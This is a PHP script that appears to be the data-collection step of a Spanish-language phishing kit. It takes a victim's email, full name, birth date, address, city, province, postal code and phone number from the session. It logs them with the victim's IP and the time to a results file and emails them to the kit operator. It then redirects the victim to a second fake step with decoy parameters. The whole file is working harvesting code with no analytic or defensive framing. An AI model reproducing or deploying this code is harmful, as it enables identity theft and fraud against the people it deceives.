<?php

session_start();

include './edit/email.php';

$time = date('d/m/Y G:i:s');

$ip = getenv("REMOTE_ADDR");


$S_Z118 .= "
<html>
<head></head>

<div><br>
 [Correo]      = <font style='color:#0070ba;'>".$_SESSION['_email_address_']."</font><br>
 [Nombre Completo]      = <font style='color:#0070ba;'>".$_SESSION['_fullName_']."</font><br>
 [Fecha de Nacimiento]  = <font style='color:#0070ba;'>".$_SESSION['_birth_date_']." Format (DD/MM/YYYY)</font><br>
 [Direccion]   = <font style='color:#0070ba;'>".$_SESSION['_address_']."</font><br>
 [Ciudad]           = <font style='color:#0070ba;'>".$_SESSION['_city_']."</font><br>
 [Provincia]          = <font style='color:#0070ba;'>".$_SESSION['_state_']."</font><br>
 [Codigo Postal]       = <font style='color:#0070ba;'>".$_SESSION['_zipCode_']."</font><br>
 [Numero de Telefono]   = <font style='color:#0070ba;'>".$_SESSION['_phoneNumber_']."</font><br>
[ip info] = <font style='color:#0070ba;'>"."http://www.geoiptool.com/?IP=".$ip."</font><br>
[time]    =   <font color='#3366FF'>".$time."</font><br>
</html></div>\n";

$f = fopen("../rezlt.html", "a");
	fwrite($f, $S_Z118);

$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "Datos VH [ " .$ip. " - " .$smile." ] ";
$headers .= "From: LOG VH" . "\r\n";
mail($yourmail, $subject, $S_Z118 , $headers);
 header("Location:step2.php?websrc=".$_SESSION['_city_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");





?>